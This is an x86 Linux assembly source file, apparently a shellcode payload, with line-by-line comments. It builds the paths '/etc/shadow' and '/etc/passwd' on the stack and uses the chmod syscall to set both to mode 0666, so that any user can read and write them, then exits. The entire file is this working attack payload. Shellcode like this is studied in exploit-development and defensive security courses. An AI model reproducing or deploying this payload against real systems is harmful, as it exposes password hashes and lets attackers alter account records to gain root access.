; Author: Robert C. Raducioiu (rbct)

global _start

section .text

_start:

    ; clear ECX, EAX, EDX
    xor ecx, ecx
    mul ecx

    ; store "/etc" into ESI
    ;   this allows me to reuse this value for the second call to chmod
    mov esi, 0x6374652f

    ; add a NULL byte (in this case a NULL DWORD) at the end of the string
    ;   pushed to the stack
    push eax

    ; store the string "/etc//shadow" on the stack
    push dword 0x776f6461
    push dword 0x68732f2f
    push esi

    ; 1st argument of chmod(): const char *pathname
    ; store into EBX the pointer to "/etc//shadow"
    mov ebx,esp

    ; set EAX to 0x0000000f -> chmod() syscall
    add al, 0xf

    ; 2nd argument of chmod(): mode_t mode
    ; in this case ECX is set to the binary value 110110110
    mov cx,0x1b6

    ; call chmod()
    int 0x80

    ; like before, it acts as the string terminator
    push eax

    ; push "/etc//passwd" to the stack
    push dword 0x64777373

    ; also set EAX to 0x0000000f -> chmod() syscall
    add al, 0xf
    push dword 0x61702f2f

    ; reuse the value of "/etc" from before
    push esi
    
    ; 1st argument of chmod(): const char *pathname
    ; store into EBX the pointer to "/etc//passwd"
    push esp
    pop ebx

    ; call chmod()
    int 0x80

    ; invoke the exit syscall
    ; exit code is set to ESP, but it's not important
    inc eax
    int 0x80
